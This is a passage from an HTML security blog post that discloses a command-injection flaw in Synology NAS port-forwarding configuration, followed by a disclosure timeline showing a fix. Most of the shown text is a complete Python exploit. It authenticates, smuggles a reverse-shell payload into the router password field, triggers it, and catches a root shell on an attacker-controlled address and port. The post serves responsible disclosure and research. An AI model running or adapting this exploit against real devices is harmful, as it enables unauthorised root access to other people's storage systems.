<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'username'</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">'passwd'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s">'OTPcode'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'__cIpHeRtExT'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'client_time'</span><span class="p">:</span><span class="s">'0'</span><span class="p">,</span><span class="s">'isIframeLogin'</span><span class="p">:</span><span class="s">'yes'</span><span class="p">}</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">'https://%s:%s/webman/login.cgi?enable_syno_token=yes'</span> <span class="o">%</span> <span class="p">(</span><span class="n">nas_ip</span><span class="p">,</span> <span class="n">nas_port</span><span class="p">)</span>
<span class="n">syno_token</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\"</span><span class="s">"</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'X-SYNO-TOKEN'</span> <span class="p">:</span> <span class="n">syno_token</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Secondly, we utilise the valid cookie and custom synology headers to set up the vulnerable router with our backdoored password:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">backdoor</span> <span class="o">=</span> <span class="s">'"b</span><span class="se">\\\'</span><span class="s">;python -c </span><span class="se">\'</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])"'</span> <span class="o">%</span> <span class="p">(</span><span class="n">my_ip</span><span class="p">,</span> <span class="n">my_port</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'router_brand'</span><span class="p">:</span><span class="s">'BT'</span><span class="p">,</span><span class="s">'router_model'</span><span class="p">:</span><span class="s">'HomeHub2.0'</span><span class="p">,</span><span class="s">'router_version'</span><span class="p">:</span><span class="s">'Version8.1.H.G_TypeA'</span><span class="p">,</span><span class="s">'router_protocol'</span><span class="p">:</span><span class="s">'http'</span><span class="p">,</span><span class="s">'router_port'</span><span class="p">:</span><span class="s">'8000'</span><span class="p">,</span><span class="s">'support_upnp'</span><span class="p">:</span><span class="s">'no'</span><span class="p">,</span><span class="s">'support_natpmp'</span><span class="p">:</span><span class="s">'no'</span><span class="p">,</span><span class="s">'router_account'</span><span class="p">:</span><span class="s">'aaaaa'</span><span class="p">,</span><span class="s">'router_pass'</span><span class="p">:</span><span class="n">backdoor</span><span class="p">,</span><span class="s">'api'</span><span class="p">:</span><span class="s">'SYNO.Core.PortForwarding.RouterConf'</span><span class="p">,</span><span class="s">'method'</span><span class="p">:</span><span class="s">'set'</span><span class="p">,</span><span class="s">'version'</span><span class="p">:</span><span class="s">'1'</span><span class="p">}</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">'https://%s:%s/webapi/_______________________________________________________entry.cgi'</span> <span class="o">%</span> <span class="p">(</span><span class="n">nas_ip</span><span class="p">,</span> <span class="n">nas_port</span><span class="p">)</span>
<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Finally, we trigger the backdoor by removing a port forwarding rule:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="s">'rules'</span><span class="p">:</span><span class="s">'[{"id":0,"enable":true,"rule_id":"1","ds_port":"1","router_port":"1","router_protocol":"tcp","serviceid":"","service_name":false,"force":false}]'</span><span class="p">,</span><span class="s">'task_id_suffix'</span><span class="p">:</span><span class="s">"PF"</span><span class="p">,</span><span class="s">'api'</span><span class="p">:</span><span class="s">'SYNO.Core.PortForwarding.Rules'</span><span class="p">,</span><span class="s">'method'</span><span class="p">:</span><span class="s">'save'</span><span class="p">,</span><span class="s">'version'</span><span class="p">:</span><span class="s">"1"</span><span class="p">}</span>
<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="pulling-it-all-together">Pulling it all together</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="n">username</span> <span class="o">=</span> <span class="s">'test'</span>
<span class="n">password</span> <span class="o">=</span> <span class="s">'test'</span>
<span class="n">nas_ip</span> <span class="o">=</span> <span class="s">'192.168.50.10'</span>
<span class="n">nas_port</span> <span class="o">=</span> <span class="mi">5001</span>
<span class="n">my_ip</span> <span class="o">=</span> <span class="s">'192.168.50.11'</span>
<span class="n">my_port</span> <span class="o">=</span> <span class="mi">1234</span>

<span class="k">print</span> <span class="s">"[+] Accessing device.."</span>
<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'username'</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">'passwd'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s">'OTPcode'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'__cIpHeRtExT'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'client_time'</span><span class="p">:</span><span class="s">'0'</span><span class="p">,</span><span class="s">'isIframeLogin'</span><span class="p">:</span><span class="s">'yes'</span><span class="p">}</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">'https://%s:%s/webman/login.cgi?enable_syno_token=yes'</span> <span class="o">%</span> <span class="p">(</span><span class="n">nas_ip</span><span class="p">,</span> <span class="n">nas_port</span><span class="p">)</span>
<span class="n">syno_token</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\"</span><span class="s">"</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'X-SYNO-TOKEN'</span> <span class="p">:</span> <span class="n">syno_token</span><span class="p">}</span>

<span class="k">print</span> <span class="s">"[+] Extracted SYNO-TOKEN %s.."</span> <span class="o">%</span> <span class="n">syno_token</span>
<span class="n">backdoor</span> <span class="o">=</span> <span class="s">'"b</span><span class="se">\\\'</span><span class="s">;python -c </span><span class="se">\'</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])"'</span> <span class="o">%</span> <span class="p">(</span><span class="n">my_ip</span><span class="p">,</span> <span class="n">my_port</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'router_brand'</span><span class="p">:</span><span class="s">'BT'</span><span class="p">,</span><span class="s">'router_model'</span><span class="p">:</span><span class="s">'HomeHub2.0'</span><span class="p">,</span><span class="s">'router_version'</span><span class="p">:</span><span class="s">'Version8.1.H.G_TypeA'</span><span class="p">,</span><span class="s">'router_protocol'</span><span class="p">:</span><span class="s">'http'</span><span class="p">,</span><span class="s">'router_port'</span><span class="p">:</span><span class="s">'8000'</span><span class="p">,</span><span class="s">'support_upnp'</span><span class="p">:</span><span class="s">'no'</span><span class="p">,</span><span class="s">'support_natpmp'</span><span class="p">:</span><span class="s">'no'</span><span class="p">,</span><span class="s">'router_account'</span><span class="p">:</span><span class="s">'aaaaa'</span><span class="p">,</span><span class="s">'router_pass'</span><span class="p">:</span><span class="n">backdoor</span><span class="p">,</span><span class="s">'api'</span><span class="p">:</span><span class="s">'SYNO.Core.PortForwarding.RouterConf'</span><span class="p">,</span><span class="s">'method'</span><span class="p">:</span><span class="s">'set'</span><span class="p">,</span><span class="s">'version'</span><span class="p">:</span><span class="s">'1'</span><span class="p">}</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">'https://%s:%s/webapi/_______________________________________________________entry.cgi'</span> <span class="o">%</span> <span class="p">(</span><span class="n">nas_ip</span><span class="p">,</span> <span class="n">nas_port</span><span class="p">)</span>
<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"[+] Backdoored external access password.."</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'rules'</span><span class="p">:</span><span class="s">'[{"id":0,"enable":true,"rule_id":"1","ds_port":"1","router_port":"1","router_protocol":"tcp","serviceid":"","service_name":false,"force":false}]'</span><span class="p">,</span><span class="s">'task_id_suffix'</span><span class="p">:</span><span class="s">"PF"</span><span class="p">,</span><span class="s">'api'</span><span class="p">:</span><span class="s">'SYNO.Core.PortForwarding.Rules'</span><span class="p">,</span><span class="s">'method'</span><span class="p">:</span><span class="s">'save'</span><span class="p">,</span><span class="s">'version'</span><span class="p">:</span><span class="s">"1"</span><span class="p">}</span>
<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"[+] Triggering backdoor.."</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">my_port</span><span class="p">)</span>
<span class="n">l</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><a href="/assets/images/8.png" data-lightbox="1"><img src="/assets/images/8.png" alt="" /></a></p>

<p>It’s running as root, so that makes privilege escalation a breeze.</p>

<p><em>Note: The astute readers might notice the vulnerable php script above will only follow the aforementioned data flow when specific patterns are matched (based on the responses received from the routers web interface). Initially, I set up a faux router (based on a real web interface for HomeHub2.0 identified via a Shodan search) to give the correct dummy responses to ensure the data flow was followed as expected. However, this ultimately was not needed to trigger the RCE, so I suspect something even more sinister is going on under the hood; which I did not investigate.</em></p>

<p>PS: for those of you playing along at home who also want a shell on their NAS. I later found it’s also possible to just enable SSH via the UI 🙂</p>

<blockquote>
  <p><em>Edit: At the request of the Synology security team, and to avoid some confusion in the usage of the ‘test’ account in the POC above, this attack can only be performed with a <strong>valid administrative account</strong>. This clearly affects the likelihood of this attack, however there a few things to consider in this particular case. Firstly, this is not intended functionality by the developers. Secondly, many of these devices are placed on the Internet and only accessible via 1 port (their web interface); so being able to gain a root shell via this method and bypass corporate firewalls/routers/etc is certainly interesting.</em></p>
</blockquote>

<h2 id="disclosure-timeline">Disclosure timeline</h2>

<table>
  <tbody>
    <tr>
      <td>13th December 2015</td>
      <td>First contact requested information on submitting security vulnerabilities</td>
    </tr>
    <tr>
      <td>14th December 2015</td>
      <td>Given address of PGP key and security contact email address</td>
    </tr>
    <tr>
      <td>14th December 2015</td>
      <td>Encrypted information about vulnerability including POST requests for a POC</td>
    </tr>
    <tr>
      <td>16th December 2015</td>
      <td>Similarly, given address of PGP key and security contact address (from another support address)</td>
    </tr>
    <tr>
      <td>16th December 2015</td>
      <td>Informed both support addresses that I have received the PGP key and submitted a POC. Requested information on when to expect a response</td>
    </tr>
    <tr>
      <td>17th December 2015</td>
      <td>Received response that the information was received and had been sent to the appropriate teams for investigation</td>
    </tr>
    <tr>
      <td>23rd December 2015</td>
      <td>Emailed to request status of the issue</td>
    </tr>
    <tr>
      <td>24th December 2015</td>
      <td>Received response that the issue is valid and fix will be applied to next DSM release</td>
    </tr>
    <tr>
      <td>24th December 2015</td>
      <td>Emailed to request an ETA for when the new DSM version will be published</td>
    </tr>
    <tr>
      <td>24th December 2015</td>
      <td>No schedule for release. Current estimate is ‘some time in February’. Will be notified when the fix is released.</td>
    </tr>
    <tr>
      <td>22nd February 2016</td>
      <td>Requested whether the fix was shadow-patched in the 5.2-5644 patch released on the 19/2/2016</td>
    </tr>
    <tr>
      <td>22nd February 2016</td>
      <td>Security team responded that the issue was fixed on January 22nd in version: 5.2-5644 Update 3 under the confusing nomenclature ‘Enhanced network stability when port forwarding is configured.’</td>
    </tr>
    <tr>
      <td>22nd February 2016</td>
      <td>Blog post published</td>
    </tr>
  </tbody>
</table>

</div>
<div id="related">
  <h3>Recent Posts</h3>
  <ul id="blog-posts" class="posts">
    
    <li>
      <span>08 Jul 2018</span> <a href="/2018/07/08/solving-CTF-challenges-with-DLL-injection/">Solving CTF challenges with DLL injection</a>
    </li>
    
    <li>
      <span>17 Oct 2017</span> <a href="/2017/10/17/a-watering-hole-with-Windows-binaries/">A watering hole with Windows binaries</a>
    </li>
    
    <li>
      <span>03 Aug 2017</span> <a href="/2017/08/03/application-whitelist-bypass-using-XLL-and-embedded-shellcode/">Application whitelist bypass using XLL and embedded shellcode</a>
    </li>
    
  </ul>
</div>

      <div class="footer">
        <div class="disclaimer">
  
  <p>
    The postings on this site are my own and don't represent my employer
  </p>
  
</div>

      </div>
    </div>
  </div>
  <script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox-plus-jquery.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js"></script>
<!--
  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
    (adsbygoogle = window.adsbygoogle || []).push({
      google_ad_client: "ca-pub-5830883927534037",
      enable_page_level_ads: true
    });
  </script>
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
    ga('create', 'UA-41399516-1', 'auto');
    ga('send', 'pageview');
  </script>
-->
</body>
</html>
